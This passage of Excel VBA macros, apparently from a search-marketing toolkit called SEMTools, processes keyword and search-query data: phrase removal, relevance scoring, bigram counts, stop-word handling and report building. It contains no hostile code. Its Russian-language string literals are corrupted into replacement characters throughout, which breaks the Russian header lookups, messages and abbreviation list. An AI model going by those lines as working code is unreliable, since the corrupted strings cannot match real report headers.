    wrd = arr(i, 1)
    tmpstr = ""
    For j = LBound(wrdarr) To UBound(wrdarr) - 1
        If dict.exists(UCase(wrdarr(j))) Then
            If UCase(dict.item(UCase(wrdarr(j)))) = UCase(wrdarr(j)) Then
                wrdarr(j) = dict.item(UCase(wrdarr(j)))
            Else
                phrEnds = Split(dict.item(UCase(wrdarr(j))), delim)
                foundPhr = False
                For k = LBound(phrEnds) To UBound(phrEnds)
                    If InStr(1, " " & wrd & " ", " " & phrEnds(k) & " ", vbTextCompare) > 0 Then
                    wrdarr(j) = phrEnds(k)
                    foundPhr = True
                    Exit For
                    Else
                    End If
                Next k
                If foundPhr = False Then wrdarr(j) = ""
            End If
        Else
        wrdarr(j) = ""
        End If
    Next j
arr(i, 1) = WStrim(Join(wrdarr, " "))
Next i
Selection.Value2 = arr
OptimizeOFF
End Sub
Sub remPhrases(rng As Range)
Dim delim As String, r As Long, i As Long, j As Long, k As Long, dict As Object, tmpstr As String, wrdarr() As String
Dim phr(), arr(), x As Long, wrd As String, phrEnds() As String
OptimizeON
selector
If Selection.Count = 1 Then Exit Sub Else arr() = Selection.Value2
    phr = rng.Value2
    delim = vbTab
    Set dict = CreateObject("Scripting.Dictionary")

    For r = LBound(phr) To UBound(phr)
        tmpstr = extrFirstWord(CStr(phr(r, 1)))
            
            If dict.exists(UCase(tmpstr)) Then
                   dict.item(UCase(tmpstr)) = dict.item(UCase(tmpstr)) & delim & phr(r, 1)
            Else:
                   dict.Add UCase(tmpstr), phr(r, 1)
            End If
    Next r

For i = LBound(arr) To UBound(arr)
    wrdarr = Split(arr(i, 1) & " ", " ")
    wrd = arr(i, 1)
    tmpstr = ""
    For j = LBound(wrdarr) To UBound(wrdarr) - 1
        If dict.exists(UCase(wrdarr(j))) Then
            If UCase(dict.item(UCase(wrdarr(j)))) = UCase(wrdarr(j)) Then
                wrd = Replace(" " & wrd & " ", " " & wrdarr(j) & " ", " ", , , vbTextCompare)
            Else
                phrEnds = Split(dict.item(UCase(wrdarr(j))), delim)
                For k = LBound(phrEnds) To UBound(phrEnds)
                    If InStr(1, " " & wrd & " ", " " & phrEnds(k) & " ", vbTextCompare) > 0 Then
                    wrd = Replace(" " & wrd & " ", " " & phrEnds(k) & " ", " ", , , vbTextCompare)
                    Exit For
                    Else
                    End If
                Next k
            End If
        Else
        End If
    Next j
arr(i, 1) = WStrim(wrd)
Next i
Selection.Value2 = arr
OptimizeOFF
End Sub
Sub replPhrasesByThemselves(rng As Range)
Dim delim As String, r As Long, i As Long, j As Long, k As Long, dict As Object, tmpstr As String, wrdarr() As String
Dim phr(), arr(), x As Long, wrd As String, phrEnds() As String
OptimizeON
selector
If Selection.Count = 1 Then Exit Sub Else arr() = Selection.Value2
    phr = rng.Value2
    delim = vbTab
    Set dict = CreateObject("Scripting.Dictionary")

    For r = LBound(phr) To UBound(phr)
        tmpstr = extrFirstWord(CStr(phr(r, 1)))
            
            If dict.exists(UCase(tmpstr)) Then
                   dict.item(UCase(tmpstr)) = dict.item(UCase(tmpstr)) & delim & phr(r, 1)
            Else:
                   dict.Add UCase(tmpstr), phr(r, 1)
            End If
    Next r

For i = LBound(arr) To UBound(arr)
    wrdarr = Split(arr(i, 1) & " ", " ")
    wrd = arr(i, 1)
    tmpstr = ""
    For j = LBound(wrdarr) To UBound(wrdarr) - 1
        If dict.exists(UCase(wrdarr(j))) Then
            If UCase(dict.item(UCase(wrdarr(j)))) = UCase(wrdarr(j)) Then
                wrd = Replace(" " & wrd & " ", " " & wrdarr(j) & " ", " " & dict.item(UCase(wrdarr(j))) & " ", , , vbTextCompare)
            Else
                phrEnds = Split(dict.item(UCase(wrdarr(j))), delim)
                For k = LBound(phrEnds) To UBound(phrEnds)
                    If InStr(1, " " & UCase(wrd) & " ", " " & UCase(phrEnds(k)) & " ", vbBinaryCompare) > 0 Then
                    wrd = Replace(" " & wrd & " ", " " & phrEnds(k) & " ", " " & phrEnds(k) & " ", , , vbTextCompare)
                    Exit For
                    Else
                    End If
                Next k
            End If
        Else
        End If
    Next j
arr(i, 1) = WStrim(wrd)
Next i
Selection.Value2 = arr
OptimizeOFF
End Sub
Sub unpivotArr(a(), delimeter As String, Optional listname As String = "unpivot")
Dim b() As String, c() As String
Dim i As Long
Dim nlrc As Long
Dim nwc As Long
Dim j As Long
Dim s As String
OptimizeON
nlrc = 0
For i = LBound(a) To UBound(a)
    If InStr(1, a(i, 1), delimeter) > 0 Then
        s = Left(a(i, 1), InStr(1, a(i, 1), delimeter) - 1)
        b = Split(Replace(CStr(a(i, 1)), delimeter, vbTab), vbTab)
        nlrc = nlrc + UBound(b)
    Else:
    End If
Next i
ReDim c(nlrc, 2)
nlrc = 0
For i = LBound(a) To UBound(a)
    If InStr(1, a(i, 1), delimeter) > 0 Then
s = Left(a(i, 1), InStr(1, a(i, 1), delimeter) - 1)
        b = Split(Replace(CStr(a(i, 1)), delimeter, vbTab), vbTab)
        nwc = UBound(b)
            For j = 1 To nwc
                c(nlrc + j, 1) = s
                c(nlrc + j, 2) = b(j)
            Next
        nlrc = nlrc + nwc
        Erase b
        Else:
    End If
Next i
With Worksheets.Add
        .name = listname
        .[a2].Resize(UBound(c), 2) = c
End With
OptimizeOFF
End Sub
Function SQRelevance(q As String, kw As String)
Dim sqwc As Long
sqwc = slov(q)
If isChild(kw, q) Then
SQRelevance = 1 - WordDiff(q, kw) / sqwc
Else
SQRelevance = (1 - WordDiff(q, kw) / countUniqueWords(q & " " & kw)) ^ 2
End If
End Function
Private Function normKWD(x) As String
x = remMinusWords(LCase$(CStr(x)))
If InStr(1, x, "|fffd|") > 0 Then x = Replace(x, "|fffd|", "|fffd|")
If InStr(1, x, ".") > 0 Then x = Replace(x, ".", " ")
If InStr(1, x, "-") > 0 Then x = Replace(x, "-", " ")
normKWD = Lemmatize(remRepWords(remMdf(byezstopslov(CStr(x)))))
End Function
Private Function normSQ(x) As String
x = LCase$(CStr(x))
If InStr(1, x, "|fffd|") > 0 Then x = Replace(x, "|fffd|", "|fffd|")
If InStr(1, x, ".") > 0 Then x = Replace(x, ".", " ")
If InStr(1, x, "-") > 0 Then x = Replace(x, "-", " ")
normSQ = Lemmatize(remRepWords(CStr(x)))
End Function
Sub SearchQueriesAnalysis(YD As Boolean)
Dim x As Long, y As Long, itemtable(), fRng As Range, arr(), arrtemp(), i As Long, rownum As Long, dict As Object, tmp() As String, z As Long
Dim qCoeffImpr As Long, qCoeffClick As Long, impressions As Long, clicks As Long, UWC As Long

ActiveSheet.Range("A1").Select
If YD = True Then
itemtable = Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd|.)", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
Else
itemtable = Array("Search term", "Keyword", "Impressions", "Clicks", "Cost", "Conversions")
End If
For i = LBound(itemtable) To UBound(itemtable)
    Set fRng = Cells.find(What:=itemtable(i), After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:=xlNext, MatchCase:=False)
    If fRng Is Nothing Then
        If YD = True Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & itemtable(i) & " |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|! |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| " & itemtable(i) Else MsgBox itemtable(i) & " NOT FOUND! Please, provide full report"
        Exit Sub
    End If
Next i

Get_lemmDict
OptimizeON
On Error Resume Next

If YD = True Then
selectAllUnder ("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
Else
selectAllUnder ("Search term")
End If

rownum = Selection.Row - 2
For i = 1 To rownum:
Rows("1:1").EntireRow.Delete
Next i

x = 10
If YD = True Then
selectAllUnder ("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
Else
selectAllUnder ("Search term")
End If
y = Selection.Rows.Count
arr() = Selection.Value2
ReDim Preserve arr(y, x)
If YD = True Then
    selectAllUnder ("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
    Else
    selectAllUnder ("Keyword")
    End If
arrtemp = Selection.Value2
For i = LBound(arr) To UBound(arr):
    arr(i, 3) = arrtemp(i, 1)
    arr(i, 4) = normKWD(CStr(arr(i, 3)))
    If hasMDFs(arr(i, 3)) Then arr(i, 2) = normSQ(arr(i, 1)) Else arr(i, 2) = byezstopslov(normSQ(arr(i, 1)))
    arr(i, 5) = SQRelevance(CStr(arr(i, 2)), CStr(arr(i, 4)))
    Next i
If YD = True Then
    selectAllUnder ("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
    Else
    selectAllUnder ("Impr.")
End If
arrtemp = Selection.Value2
For i = LBound(arr) To UBound(arr):
    arr(i, 6) = LCase$(arrtemp(i, 1))
Next i
If YD = True Then
    selectAllUnder ("|fffd||fffd||fffd||fffd||fffd|")
    Else
    selectAllUnder ("Clicks")
End If
arrtemp = Selection.Value2
For i = LBound(arr) To UBound(arr):
    arr(i, 7) = LCase$(arrtemp(i, 1))
Next i
If YD = True Then
    selectAllUnder ("|fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd|.)")
    Else
    selectAllUnder ("Cost")
End If
arrtemp = Selection.Value2
For i = LBound(arr) To UBound(arr):
    arr(i, 8) = arrtemp(i, 1)
Next i
If YD = True Then
    selectAllUnder ("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
    Else
    selectAllUnder ("Conversions")
End If
Selection.Replace What:="-", Replacement:="0", LookAt:=xlWhole
arrtemp = Selection.Value2
For i = LBound(arr) To UBound(arr):
    arr(i, 9) = arrtemp(i, 1)
Next i
For i = LBound(arr) To UBound(arr):
    arr(i, 10) = arr(i, 6) - arr(i, 6) * arr(i, 5)
Next i
If YD = True Then
With Worksheets.Add
    .name = "SEMTools SQ Report"
    .[a2].Resize(y, x) = arr
    .[a1].Value2 = "|fffd||fffd|"
    .[b1].Value2 = "|fffd||fffd| (norm)"
    .[C1].Value2 = "|fffd||fffd||fffd||fffd||fffd|"
    .[d1].Value2 = "|fffd||fffd||fffd||fffd||fffd| (norm)"
    .[e1].Value2 = "|fffd||fffd||fffd||fffd||fffd|.|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    .[f1].Value2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    .[g1].Value2 = "|fffd||fffd||fffd||fffd||fffd|"
    .[h1].Value2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    .[i1].Value2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    .[j1].Value2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
End With
    Else
With Worksheets.Add
    .name = "SEMTools SQ Report"
    .[a2].Resize(y, x) = arr
    .[a1].Value2 = "SQ"
    .[b1].Value2 = "SQ (norm)"
    .[C1].Value2 = "Keyword"
    .[d1].Value2 = "KWD (norm)"
    .[e1].Value2 = "Semantics quality"
    .[f1].Value2 = "Impressions"
    .[g1].Value2 = "Clicks"
    .[h1].Value2 = "Cost"
    .[i1].Value2 = "Conversions"
    .[j1].Value2 = "Quality Potential"
End With
End If
'|fffd||fffd||fffd||fffd|
    Range("L1").FormulaR1C1 = "=SUMPRODUCT(C[-6],C[-7])/SUM(C[-6])"
    Range("L2").FormulaR1C1 = "=SUMPRODUCT(C[-5],C[-7])/SUM(C[-5])"
If YD = False Then
    Range("M1").Value = "Semantics quailty per impr"
    Range("M2").Value = "Semantics quality per click"
Else:
    Range("M1").Value = "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    Range("M2").Value = "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
End If

ActiveWorkbook.Worksheets("SEMTools SQ Report").Select
Set dict = CreateObject("Scripting.Dictionary")
With dict
    .CompareMode = BinaryCompare
End With
r = 2
Do While Cells(r, 2) <> ""
    txt = Cells(r, 2)
    tmp = Split(txt, " ")
    y = Cells(r, 6).Value2
    For i = 0 To UBound(tmp)
    If dict.exists(tmp(i)) Then
    dict.item(tmp(i)) = dict.item(tmp(i)) + y
    Else
    dict.Add tmp(i), y
    End If
    Next i
    r = r + 1
Loop
With dict
    Cells(2, 16).Resize(.Count) = Application.Transpose(.Keys)
    Cells(2, 17).Resize(.Count) = Application.Transpose(.Items)
End With
    Cells(1, 16) = "1-Gram"
    Cells(1, 17) = "Impressions"
dict.RemoveAll
'kliki
r = 2
Do While Cells(r, 2) <> ""
    txt = Cells(r, 2)
    tmp = Split(txt, " ")
    z = Cells(r, 7).Value2
    For i = 0 To UBound(tmp)
    If dict.exists(tmp(i)) Then
    dict.item(tmp(i)) = dict.item(tmp(i)) + z
    Else
    dict.Add tmp(i), z
    End If
    Next i
    r = r + 1
Loop
With dict
    Cells(2, 18).Resize(.Count) = Application.Transpose(.Items)
End With
dict.RemoveAll
Cells(1, 18) = "Clicks"
'raskhod
r = 2
Do While Cells(r, 2) <> ""
    txt = Cells(r, 2)
    tmp = Split(txt, " ")
    z = Cells(r, 8).Value2
    For i = 0 To UBound(tmp)
    If dict.exists(tmp(i)) Then
    dict.item(tmp(i)) = dict.item(tmp(i)) + z
    Else
    dict.Add tmp(i), z
    End If
    Next i
    r = r + 1
Loop
With dict
    Cells(2, 20).Resize(.Count) = Application.Transpose(.Items)
End With
dict.RemoveAll
Cells(1, 20) = "Cost"
'konvyersii
r = 2
Do While Cells(r, 2) <> ""
    txt = Cells(r, 2)
    tmp = Split(txt, " ")
    z = Cells(r, 9).Value2
    For i = 0 To UBound(tmp)
    If dict.exists(tmp(i)) Then
    dict.item(tmp(i)) = dict.item(tmp(i)) + z
    Else
    dict.Add tmp(i), z
    End If
    Next i
    r = r + 1
Loop
With dict
    Cells(2, 19).Resize(.Count) = Application.Transpose(.Items)
End With
dict.RemoveAll
Cells(1, 19) = "Conversions"

'raschyetnyye myetriki
Cells(1, 21) = "CTR"
Cells(1, 22) = "CR"
Cells(1, 23) = "CPA"
Cells(1, 24) = "CPC"
    Range("U2").FormulaR1C1 = "=RC[-3]/RC[-4]"
    Range("U2").AutoFill Destination:=Range("U2:W2"), Type:=xlFillDefault
    Range("X2").FormulaR1C1 = "=RC[-4]/RC[-6]"
    Columns("U:V").Style = "Percent"
    Columns("U:V").NumberFormat = "0.0%"
    Columns("W:X").Style = "Currency"
    Columns("A:N").ColumnWidth = 4

OptimizeOFF
End Sub
Sub gyenyerator_linyeynykh_kombinatsiy()
Dim i As Long, j As Long, k As Long, comb As Long, arrtemp() As Variant, _
ColumnLengthsValues() As Long, ItemsCounter As Long, IndexTable() As Long, _
itemtable() As String, strvar As String
Dim x As Long ' razmyernost x
Dim y As Long ' razmyernost y
OptimizeON
x = ActiveSheet.UsedRange.Columns.Count

ReDim ColumnLengthsValues(x)

For i = 1 To x
    ItemsCounter = 0
    Do While Cells(ItemsCounter + 1, i) <> ""
    ColumnLengthsValues(i) = ItemsCounter + 1
    ItemsCounter = ItemsCounter + 1
    Loop
Next
y = 1
For i = LBound(ColumnLengthsValues) To UBound(ColumnLengthsValues)
y = y * ColumnLengthsValues(i)
Next
ReDim IndexTable(y, x)
comb = ColumnLengthsValues(1)
For i = 1 To x
    k = 1
    For j = 1 To y
        If j \ (y / comb) <> j / (y / comb) Then
        IndexTable(j, i) = k
        Else: IndexTable(j, i) = k
            If k <> ColumnLengthsValues(i) Then
            
            k = k + 1
            Else: k = 1
            End If
        End If
    Next j
    If i < UBound(ColumnLengthsValues) Then comb = comb * ColumnLengthsValues(i + 1)
Next i
ReDim itemtable(y, x)
ReDim arrtemp(1, 1)
For i = 1 To x
    Erase arrtemp
    If ColumnLengthsValues(i) = 1 Then
        strvar = Cells(1, i).Value2
        For j = 1 To y
            itemtable(j, i) = strvar
        Next j
    Else:
    ReDim arrtemp(ColumnLengthsValues(i), 1)
    arrtemp = Range(Cells(1, i), Cells(ColumnLengthsValues(i), i)).Value2
        For j = 1 To y
            itemtable(j, i) = arrtemp(IndexTable(j, i), 1)
        Next j
    End If
Next i
    With Worksheets.Add
        .[a1].Resize(y, x) = itemtable
    End With
    
OptimizeOFF
End Sub
Sub freqDict2GramsWithStopWords(columnNum As Long)
Dim x As Variant, txt As String, i As Long, arr(), z As Long, dict As Object, tmpstr As String
Dim a() As String
a = Split(stopwords())
OptimizeON

Set dict = CreateObject("Scripting.Dictionary")
arr = Selection.Value2
For z = LBound(arr) To UBound(arr)
    txt = WStrim(arr(z, 1))
    x = Split(txt, " ")
        For i = 0 To UBound(x) - 1
            If IsInArray(x(i), a) Or IsInArray(x(i + 1), a) And i + 1 = UBound(x) Then
            ElseIf IsInArray(x(i + 1), a) Then
            tmpstr = x(i) & " " & x(i + 1) & " " & x(i + 2)
            Else:
            tmpstr = x(i) & " " & x(i + 1)
            End If
                If dict.exists(tmpstr) Then
                    If columnNum = 1 Then dict.item(tmpstr) = dict.item(tmpstr) + 1 Else dict.item(tmpstr) = dict.item(tmpstr) + arr(z, columnNum)
                Else
                    If columnNum = 1 Then dict.Add tmpstr, 1 Else dict.Add tmpstr, arr(z, columnNum)
                End If
        Next i
Next z
dictToWS dict, 2, 1, 1
'
    Cells(1, 1) = "bigramma"
    Cells(1, 2) = "summa po pokazatyelyu"
'
OptimizeOFF
End Sub
Sub freqDict2GramsWithStopWordsThrough2ndColumn()
Dim x As Variant, txt As String, i As Long, arr(), z As Long, dict As Object, tmpstr As String
Dim a() As String
a = Split(stopwords())
OptimizeON
Set dict = CreateObject("Scripting.Dictionary")
arr = Selection.Value2
For z = LBound(arr) To UBound(arr)
    txt = WStrim(arr(z, 1))
    x = Split(txt, " ")
        For i = 0 To UBound(x) - 1
            If IsInArray(x(i), a) Or IsInArray(x(i + 1), a) And i + 1 = UBound(x) Then
            ElseIf IsInArray(x(i + 1), a) Then
            tmpstr = x(i) & " " & x(i + 1) & " " & x(i + 2)
            Else:
            tmpstr = x(i) & " " & x(i + 1)
            End If
                If dict.exists(tmpstr) Then
                dict.item(tmpstr) = dict.item(tmpstr) + 1
                Else
                dict.Add tmpstr, 1
                End If
        Next i
Next z
dictToWS dict, 2, 1, 1
'
    Cells(1, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Cells(1, 2) = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
'
OptimizeOFF
End Sub
Sub delWordsArrFromPhrasesArr(wordsArr, phrasesArr)
Dim i As Long, j As Long, k As Long, deleted As Object
OptimizeON
Set deleted = CreateObject("Scripting.Dictionary")
    For i = LBound(wordsArr) To UBound(wordsArr)
        deleted.Add (wordsArr(i)), False
    Next
For j = LBound(phrasesArr) To UBound(phrasesArr)
    x = Split(phrasesArr(j), " ")
        For k = LBound(x) To UBound(x)
            If deleted.exists(x(k)) Then x(k) = ""
        Next k
    phrasesArr(j) = WStrim(Join(x, " "))
Next j
OptimizeOFF
End Sub
Sub delWordsArrFromPhrases2dimArr(wordsArr, phrasesArr)
Dim i As Long, j As Long, k As Long, deleted As Object
OptimizeON
Set deleted = CreateObject("Scripting.Dictionary")
    For i = LBound(wordsArr) To UBound(wordsArr)
        deleted.Add (wordsArr(i)), False
    Next
For j = LBound(phrasesArr) To UBound(phrasesArr)
    x = Split(phrasesArr(j, 1), " ")
        For k = LBound(x) To UBound(x)
            If deleted.exists(x(k)) Then x(k) = ""
        Next k
    phrasesArr(j, 1) = WStrim(Join(x, " "))
Next j
OptimizeOFF
End Sub
Sub Del1DimArr(b)
Dim x As Variant, i As Long, j As Long, r As Long, deleted As Object
Dim a()
OptimizeON
If Selection.Count > 1 Then a = Selection.Value2 Else a = Range(Selection, Selection.Offset(0, 1)).Value2
Set deleted = CreateObject("Scripting.Dictionary")
    For j = LBound(b) To UBound(b)
        deleted.Add (b(j)), False
    Next
For r = LBound(a) To UBound(a):
    x = Split(a(r, 1), " ")
        For i = LBound(x) To UBound(x)
            If deleted.exists(x(i)) Then x(i) = ""
        Next
        a(r, 1) = WStrim(Join(x, " "))
Next
    Selection.Value2 = a
OptimizeOFF
End Sub
Sub udalitstopslova()
UDFArr ("byezstopslov")
End Sub
Sub OpenSelectedURLs()
Dim a(), i As Long
If Selection.Count > 1 Then a = Selection.Value2 Else a = Range(Selection, Selection.Offset(0, 1)).Value2
For i = LBound(a) To UBound(a):
    callWebPage (a(i, 1))
    Next
End Sub
Sub udalit_slova_poslyednyeye()
UDFArr ("udalitslovaposlyednyeye")
End Sub
Sub udalit_slova_pyervoye()
UDFArr ("udalitslovapyervoye")
End Sub
Sub udalit_punktuatsiyu()
UDFArr ("removePunctuation")
OptimizeON
With Selection
.Replace What:="|fffd|", Replacement:="|fffd|"
.Replace What:="|fffd|", Replacement:="|fffd|"
End With
OptimizeOFF
End Sub
Sub udalit_osnovnyye()
OptimizeON
With Selection
.Replace What:=".", Replacement:=" "
.Replace What:="-", Replacement:=" "
.Replace What:="'", Replacement:=" "
.Replace What:="|fffd|", Replacement:="|fffd|"
.Replace What:="|fffd|", Replacement:="|fffd|"
End With
udalit_lprobyely
OptimizeOFF
End Sub
Sub udalitmodifikatorystopslov()
Dim x As Variant, txt As String, i As Long, j As Long, r As Long, dictstop As Object
Dim a()
Dim b() As String
OptimizeON
If Selection.Count > 1 Then a = Selection.Value2 Else a = Range(Selection, Selection.Offset(0, 1)).Value2
    b = Split(stopwordsAll())
Set dictstop = CreateObject("Scripting.Dictionary")
    For j = LBound(b) To UBound(b)
        dictstop.Add "+" & b(j), False
        dictstop.Add "!" & b(j), False
    Next
For r = LBound(a) To UBound(a):
    x = Split(a(r, 1), " ")
        For i = LBound(x) To UBound(x)
            If dictstop.exists(x(i)) Then
            x(i) = Mid$(x(i), 2)
            End If
            a(r, 1) = WStrim(Join(x, " "))
        Next
Next
    Selection.Value2 = a
OptimizeOFF
End Sub
Sub prostavitmodifikatoryustopslov()
Dim x As Variant, txt As String, i As Long, j As Long, r As Long, dict As Object, modifier As String
modifier = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (! |fffd||fffd||fffd| +)", "! |fffd||fffd||fffd| +", Type:=2)
Dim a()
Dim b() As String
OptimizeON
If Selection.Count > 1 Then a = Selection.Value2 Else a = Range(Selection, Selection.Offset(0, 1)).Value2
    b = Split(stopwords())
Set dict = CreateObject("Scripting.Dictionary")
    For j = LBound(b) To UBound(b)
        dict.Add UCase$(b(j)), False
    Next
For r = LBound(a) To UBound(a):
    x = Split(a(r, 1), " ")
        For i = LBound(x) To UBound(x)
            If dict.exists(UCase$(x(i))) Then
            x(i) = modifier & x(i)
            End If
            a(r, 1) = WStrim(Join(x, " "))
        Next
Next
    Selection.Value2 = a
OptimizeOFF
End Sub
Sub ryegistr_naytiabbryeviatury()
OptimizeON
Dim dict As Object, v As Boolean, w As Boolean, x As Long, y As Boolean, z As Boolean, strg As String, i As Long, j As Long, k As Long, check As String, a(), b(), exc()
    exc = Array("ar", "atx", "abs", "afu", "akg", "asr", "cia", "dpi", "erp", "esp", "fbi", "fifa", "hdmi", "ip", "itx", "kia", "nba", "oem", "suv", "tdi", "tsi", "qwerty", "vip", "uefa", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", _
"|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", _
"|fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", _
"|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", _
"|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", _
"|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", _
